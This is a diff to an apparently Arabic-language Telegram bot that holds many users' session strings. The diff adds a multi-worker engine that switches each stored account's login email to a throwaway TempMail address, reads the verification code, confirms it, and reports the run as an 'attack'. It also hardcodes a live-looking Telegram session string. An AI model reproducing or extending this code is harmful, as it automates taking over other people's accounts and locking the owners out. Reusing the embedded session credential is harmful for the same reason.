@@ -729,8 +729,6 @@ async def execute_full_migration(acc_id, client_a, original_owner, admin_id, pho
 
 
 
-
-
 def home_keyboard(uid):
     markup = InlineKeyboardMarkup()
     markup.row(InlineKeyboardButton("• إنـهـاء الـجـلـسـات الأُخـرى ☠️", callback_data="menu_terminate"))
@@ -740,6 +738,9 @@ def home_keyboard(uid):
     markup.row(InlineKeyboardButton("• إدارة الـتـحـقـق بـخـطـوتـيـن 🔐", callback_data="menu_2fa_manage"))
     markup.row(InlineKeyboardButton("• كـشـف الـحـسـابـات 🕵️", callback_data="reveal_accounts"), InlineKeyboardButton("• فـحـص الـحـسـابـات 🔄", callback_data="check_active"))
     markup.row(InlineKeyboardButton("• عـرض الـجـلـسـات 📂", callback_data="view_sessions_menu"))
+    
+    # 🌟 الزر الجديد الخاص بأتمتة الإيميلات
+    markup.row(InlineKeyboardButton("• أتمتة تغيير الإيميل السريع 📧", callback_data="auto_email_menu"))
 
     if uid in ADMIN_IDS:
         markup.row(InlineKeyboardButton("• إضافـة مسـتخـدم ➕", callback_data="admin_add_user"), InlineKeyboardButton("• حظـر مسـتخـدم 🚫", callback_data="admin_ban_user"))
@@ -755,6 +756,261 @@ def home_keyboard(uid):
 
 
 
+
+
+
+
+
+
+
+# الجلسة الافتراضية الأساسية
+DEFAULT_TEMP_MAIL_SESSION = "BAG3abEApn9HAeUDClfSg0Yr3ayAz-xleU2bL19tQq3hpCHKUSUXxhMa7pwhyVQ2-puKcgL9gZmOfBJDblYBeGmf1Gx1cVT2dFmdlc264OLbPYTNilnPpBXgLthMNjfaeCSqUkzJZhTYMWCMKSwivuO7WqZ7X9l_REJMSDQKRfVgyucr2QOKpm2MWjI9SM9FMcbV_CY1Pmq7S9OiFM4a7gt0JMyG_cwZumiCJwfYV1y7lCjaYqDNYN8vU8nv5To8X2u5LzGqi2ssMhWjWoOT5E4jqgH8RPy9_e6W2VRMQStebxoziBOc_XNvJjagZIAjulB445efkGDPFanhiiIcmq3LPpNGVQAAAAAAAAAAAA"
+
+# قاموس لتخزين الجلسات المساعدة (Workers) لكل آدمن
+CUSTOM_WORKERS = {}
+
+# ==========================================
+# 🛠 واجهات أتمتة الإيميل
+# ==========================================
+@bot.callback_query_handler(func=lambda call: call.data == "auto_email_menu")
+def auto_email_menu(call):
+    if not is_allowed(call.from_user.id): return
+    markup = InlineKeyboardMarkup()
+    markup.row(InlineKeyboardButton("🚀 بدء التغيير السريع للجميع", callback_data="start_auto_email_all"))
+    markup.row(InlineKeyboardButton("➕ إضافة حسابات مساعدة (Workers)", callback_data="add_worker_accounts"))
+    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_home"))
+    
+    workers_count = len(CUSTOM_WORKERS.get(call.from_user.id, [])) + 1
+    text = (
+        f"📧 **نظام تغيير إيميل تسجيل الدخول الأوتوماتيكي:**\n\n"
+        f"🤖 **حسابات التغيير النشطة (Workers):** {workers_count}\n"
+        f"⚡️ سيتم تقسيم العمل عليهم لضمان أقصى سرعة وتجنب التداخل.\n\n"
+        f"• اختر الإجراء المناسب:"
+    )
+    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+@bot.callback_query_handler(func=lambda call: call.data == "add_worker_accounts")
+def add_worker_accounts(call):
+    if not is_allowed(call.from_user.id): return
+    markup = InlineKeyboardMarkup()
+    accounts = get_all_accounts(call.from_user.id)
+    
+    markup.row(InlineKeyboardButton("🌍 إضافة الجميع كحسابات مساعدة", callback_data="set_worker:all"))
+    for acc_id, phone, name, uid, _ in accounts:
+        markup.row(InlineKeyboardButton(f"➕ {name} | {phone}", callback_data=f"set_worker:{acc_id}"))
+        
+    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="auto_email_menu"))
+    bot.edit_message_text("➕ **اختر الحساب الذي تريد استخدامه كحساب مساعد (Worker):**", call.message.chat.id, call.message.message_id, reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("set_worker:"))
+def set_worker_account(call):
+    if not is_allowed(call.from_user.id): return
+    target = call.data.split(":")[1]
+    
+    if call.from_user.id not in CUSTOM_WORKERS:
+        CUSTOM_WORKERS[call.from_user.id] = []
+        
+    if target == "all":
+        accounts = get_all_accounts(call.from_user.id)
+        CUSTOM_WORKERS[call.from_user.id] = [acc[4] for acc in accounts] 
+        msg = f"✅ تم تعيين {len(accounts)} حساب كعمال مساعدة بنجاح!"
+    else:
+        acc = get_account(int(target))
+        if acc and acc[5] not in CUSTOM_WORKERS[call.from_user.id]:
+            CUSTOM_WORKERS[call.from_user.id].append(acc[5])
+        msg = f"✅ تم إضافة الحساب لجيش التغيير السريع!"
+        
+    bot.answer_callback_query(call.id, msg, show_alert=True)
+    auto_email_menu(call)
+
+# ==========================================
+# ⚙️ محركات TempMail الذكية (محدثة وخالية من الثغرات)
+# ==========================================
+async def fetch_temp_mail(worker_client):
+    """دالة للتواصل مع البوت وتوليد إيميل جديد عبر /start"""
+    try:
+        await worker_client.send_message("TempMail_org_bot", "/start")
+        # محاولة البحث عن الإيميل خلال 6 ثوانٍ
+        for _ in range(3):
+            await asyncio.sleep(2)
+            async for msg in worker_client.get_chat_history("TempMail_org_bot", limit=2):
+                if msg.text and ("@" in msg.text):
+                    match = re.search(r'([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)', msg.text)
+                    if match: return match.group(1)
+    except Exception:
+        pass
+    return None
+
+async def wait_for_email_code(worker_client, start_time):
+    """دالة انتظار الكود من البوت بدقة وتجنب الأرقام العشوائية"""
+    for _ in range(15): # أقصى انتظار 30 ثانية
+        await asyncio.sleep(2)
+        async for msg in worker_client.get_chat_history("TempMail_org_bot", limit=2):
+            if msg.date and msg.date.timestamp() >= start_time:
+                # \b تضمن التقاط رقم من 5 أو 6 خانات فقط (ليس جزء من رقم هاتف أو آيدي)
+                match = re.search(r'\b(\d{5,6})\b', msg.text)
+                if match: return match.group(1)
+    return None
+
+# ==========================================
+# 🚀 محرك العمل المتوازي (Workers Engine)
+# ==========================================
+async def email_changer_worker(worker_session, target_queue, status_data):
+    worker_client = Client(f"wk_{int(time.time()*1000)}", api_id=API_ID, api_hash=API_HASH, session_string=worker_session, in_memory=True)
+    
+    try:
+        await worker_client.connect()
+    except Exception:
+        status_data['log'].append("❌ فشل اتصال أحد حسابات التغيير (Worker).")
+        return
+
+    while not target_queue.empty():
+        try:
+            target_data = await target_queue.get()
+            target_id, target_phone, target_session = target_data
+            
+            status_data['log'].append(f"⏳ جاري معالجة {target_phone}...")
+            
+            new_email = await fetch_temp_mail(worker_client)
+            if not new_email:
+                status_data['failed'] += 1
+                status_data['log'].append(f"❌ {target_phone}: فشل جلب إيميل.")
+                target_queue.task_done()
+                continue
+                
+            target_client = Client(f"tg_{target_id}_{int(time.time()*1000)}", api_id=API_ID, api_hash=API_HASH, session_string=target_session, in_memory=True)
+            try:
+                await target_client.connect()
+                
+                req_time = time.time()
+                await target_client.invoke(SendVerifyEmailCode(email=new_email, purpose=EmailVerifyPurposeLoginSetup()))
+                
+                code = await wait_for_email_code(worker_client, req_time)
+                if not code:
+                    raise Exception("لم يصل الكود للإيميل")
+                    
+                await target_client.invoke(VerifyEmail(email=new_email, purpose=EmailVerifyPurposeLoginSetup(), verification=code))
+                
+                status_data['success'] += 1
+                status_data['log'].append(f"✅ {target_phone}: تم التغيير لـ `{new_email}`")
+                
+            except FloodWait as e:
+                # سد ثغرة انهيار اللوب بسبب الفلود
+                status_data['failed'] += 1
+                status_data['log'].append(f"❌ {target_phone}: محظور ({e.value}s)")
+            except Exception as e:
+                err_str = str(e).upper()
+                if "EMAIL_INVALID" in err_str:
+                    reason = "الإيميل غير مدعوم"
+                elif "EMAIL_VERIFY_EXPIRED" in err_str:
+                    reason = "الكود منتهي الصلاحية"
+                else:
+                    reason = "لا يدعم/مضاف مسبقاً"
+                
+                status_data['failed'] += 1
+                status_data['log'].append(f"❌ {target_phone}: {reason}")
+            finally:
+                # تأكيد الإغلاق في جميع الحالات لمنع تسرب الذاكرة
+                if target_client.is_connected:
+                    await target_client.disconnect()
+            
+            target_queue.task_done()
+            
+        except Exception:
+            target_queue.task_done()
+            
+    if worker_client.is_connected:
+        await worker_client.disconnect()
+
+async def live_progress_updater(chat_id, msg_id, status_data):
+    last_text = ""
+    while not status_data['done']:
+        total = status_data['total']
+        processed = status_data['success'] + status_data['failed']
+        pending = total - processed
+        percent = int((processed / total) * 100) if total > 0 else 0
+        
+        filled = int(percent / 10)
+        bar = "🟩" * filled + "⬜️" * (10 - filled)
+        
+        recent_logs = "\n".join(status_data['log'][-6:])
+        
+        text = (
+            f"🔄 **جاري الهجوم وتغيير الإيميلات...**\n\n"
+            f"📊 **التقدم:** {bar} {percent}%\n"
+            f"⏱ **قيد الانتظار:** {pending}\n"
+            f"✅ **نجاح:** {status_data['success']} | ❌ **فشل:** {status_data['failed']}\n"
+            f"━━━━━━━━━━━━━━━━\n"
+            f"📡 **السجل المباشر:**\n{recent_logs}"
+        )
+        
+        if text != last_text:
+            try:
+                bot.edit_message_text(text, chat_id, msg_id)
+                last_text = text
+            except Exception:
+                pass
+                
+        await asyncio.sleep(2)
+
+@bot.callback_query_handler(func=lambda call: call.data == "start_auto_email_all")
+def start_auto_email_all(call):
+    if not is_allowed(call.from_user.id): return
+    
+    accounts = get_all_accounts(call.from_user.id)
+    if not accounts:
+        return bot.answer_callback_query(call.id, "❌ لا توجد حسابات مسجلة!", show_alert=True)
+        
+    status_msg = bot.edit_message_text("⏳ **يتم تجهيز الأسطول والمحركات...**", call.message.chat.id, call.message.message_id)
+    
+    workers = [DEFAULT_TEMP_MAIL_SESSION]
+    if call.from_user.id in CUSTOM_WORKERS:
+        workers.extend(CUSTOM_WORKERS[call.from_user.id])
+        
+    workers = list(set(workers))
+    run_async(run_email_automation(call.message.chat.id, status_msg.message_id, accounts, workers))
+
+async def run_email_automation(chat_id, msg_id, accounts, worker_sessions):
+    queue = asyncio.Queue()
+    for acc in accounts:
+        queue.put_nowait((acc[0], acc[1], acc[4]))
+        
+    status_data = {
+        'total': len(accounts),
+        'success': 0,
+        'failed': 0,
+        'done': False,
+        'log': ["🚀 تم بدء التشغيل..."]
+    }
+    
+    updater_task = asyncio.create_task(live_progress_updater(chat_id, msg_id, status_data))
+    
+    worker_tasks = []
+    for w_session in worker_sessions:
+        task = asyncio.create_task(email_changer_worker(w_session, queue, status_data))
+        worker_tasks.append(task)
+        
+    await queue.join()
+    
+    for task in worker_tasks:
+        task.cancel()
+        
+    status_data['done'] = True
+    await asyncio.sleep(0.5) 
+    
+    final_text = (
+        f"🏁 **تمت عملية تغيير الإيميلات بنجاح!**\n\n"
+        f"⎉╎ إجمالي الحسابات: {status_data['total']}\n"
+        f"✅ نجاح: {status_data['success']}\n"
+        f"❌ فشل: {status_data['failed']}\n\n"
+        f"⚡️ تم التغيير بواسطة {len(worker_sessions)} حساب مساعد (Worker) في نفس الوقت."
+    )
+    
+    markup = InlineKeyboardMarkup().row(InlineKeyboardButton("🔙 العودة للرئيسية", callback_data="back_home"))
+    try:
+        bot.edit_message_text(final_text, chat_id, msg_id, reply_markup=markup)
+    except Exception:
+        bot.send_message(chat_id, final_text, reply_markup=markup)
 
 
 
